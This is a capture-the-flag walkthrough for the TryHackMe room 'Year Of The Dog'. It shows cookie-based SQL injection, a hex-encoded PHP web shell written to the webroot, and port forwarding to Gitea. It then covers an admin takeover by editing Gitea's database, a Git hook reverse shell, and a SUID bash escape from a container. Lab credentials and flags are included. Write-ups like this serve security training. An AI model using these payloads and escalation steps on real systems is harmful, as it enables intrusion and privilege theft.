> Year Of The Dog

**export IP=10.10.82.57**

# Nmap

sudo nmap -sC -sV -T4 -Pn -p- -vv -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Canis Queue
```

# Nikto

nikto -h http://$IP

```
Nil
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,sql,js,bin,tar,zip,cgi

```
/index.php (Status: 200)
/assets (Status: 301)
/config.php (Status: 200)
```

Looking at the cookies we can see that we are given a number acc. to our cookie. When trying to change the cookie value we get an error and is reflected in the number's position. So, it must be SQLi.

Let's try some manual exploitation. 

# POC

Changing the cookie value `d8c7447ceafdbecd8f0b6db20e24f772'` we have an error.

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''d8c7447ceafdbecd8f0b6db20e24f772''' at line 1
```

# Finding the number of columns 

```
Cookie: id=d8c7447ceafdbecd8f0b6db20e24f772' union select 1-- - => Error
Cookie: id=d8c7447ceafdbecd8f0b6db20e24f772' union select 1, 2-- - => We got a hit!!
```

# Enumerating 

1. Version => `Cookie: id=d8c7447ceafdbecd8f0b6db20e24f772' union select 1, @@version-- -` => `5.7.31-0ubuntu0.18.04.1`
2. Current User => `Cookie: id=d8c7447ceafdbecd8f0b6db20e24f772' union select 1, current_user()-- -` => `web@localhost`
3. Current Database => `Cookie: id=d8c7447ceafdbecd8f0b6db20e24f772' union select 1, database()-- -` => `webapp`
4. Table Name => `Cookie: id=d8c7447ceafdbecd8f0b6db20e24f772' union select 1, table_name from information_schema.tables-- -` => `queue`

Looks like we can output files to webroot. Let's exploit this!!

## Shell

`cookie id = d8c7447ceafdbecd8f0b6db20e24f772' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -`

Here we output a file in location of /var/www/html and in MySQL the lines can be terminated by even hex. So, it's a hex converted shell. 

`cat shell.php | xxd -ps -c 200 | tr -d '\n'`

We got a shell!

And looking at `/var/www/html/config.php` we got some creds. for mysql maybe `web`:`Cda3RsDJga`. 

We can't gather any in mysql so let's move on to /home. We got an user dylan. In his home dir. we can find a ASCII text file and it looks like a log and looking it through we can see that he mistyped hos username and password at the same time.

```
Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
``` 

So, his creds. must be `dylan`:`Labr4d0rs4L1f3`. We can either SSH as dylan or just su as dylan.

# user.txt

```
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}
```

After running some enumeration scripts we come across Gitea and port 3000.

ss -tulwn

```
tcp    LISTEN   0        128                127.0.0.1:3000             0.0.0.0:* 
```

# 2 methods

1. Let's put a socat static binary there and try to redirect the traffic to our local system.

./socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:3000 &

Or 

2. ssh -L 3000:localhost:3000 dylan@$IP

I followed step 1. And navigating to `http://$IP:8080` we got a webpage. We can sign-in as dylan but he has 2FA enabled. So moving to the shell.

Navigating to `/gitea` directory we can find that we have gitea.db but we don't have sqlite3.

locate sqlite => this shows that python3 has it.

Let's create a test account in gitea and now download it to our machine so that we can have our details in it too!

scp dylan@$IP:/gitea/gitea/gitea.db gitea.db

And opening it in sqlite3 we can see that we have a table `two factor` in db.And we had 2FA for dylan account too. Let's delete this table using python3 in victim machine and try to bypass this!

```
>>> import sqlite3
>>> conn=sqlite3.connect("gitea.db")
>>> conn.execute("delete from two_factor")
<sqlite3.Cursor object at 0x7f0f95b64d50>
>>> conn.close()
```

Uuh! Didn' work. Looking at other columns we can see that we have a column is_admin adn we have is_admin as 0 adn admin has it as 1. Let's update it in our local machine and overwrite it with our own in the victim machine.

select lower_name, is_admin from user;

```
dylan|1
test|0
```

update user set is_admin=1 where lower_name="test";

We have uploaded our own db and overwritten it.

scp gitea.db dylan@$IP:/gitea/gitea/gitea.db

Now we have our own account as admin. And let's create a repository named `test` and let's initiate with README.md. So now we can see something in Settings as GitHooks. They are scripts executed when a push happens. It's a simple bash let's put a one-line rev-shell in the EOF. And `Update Hook`. 

## Steps

```
git clone http://localhost:3000/test/test_repo && cd test_repo
echo "test" >> README.md
git add README.md
git commit -m "Exploit"
git push
```

And listening in netcat we got our shell!! But we are in a container as `git` user. Which means whatever we create it'll be dylan's so we have to elevate our privileges and create a malicious file. First let's privesc as root in the container!!

```
sudo -l
User git may run the following commands on 42040a8f97fc:
    (ALL) NOPASSWD: ALL
sudo su root
```

We have root priv in container now! Now we have to create a malicious file in location similar to the container and dylan's SSH session. In Dylan's home `/gitea/gitea` and in container `/data/gitea` the file structure is similar. 

# Steps to Escalate as root

## Dylan's home

Move to /bin directory and check your ip too then,

1. python3 -m http.server 8000

## Conatiner

wget http://$IP:8000/bash -O /data/bash
chmod 4755 /data/bash

And finally now move to dylan's home and run `./bash -p`. And we are root!

# root.txt

```
THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}
```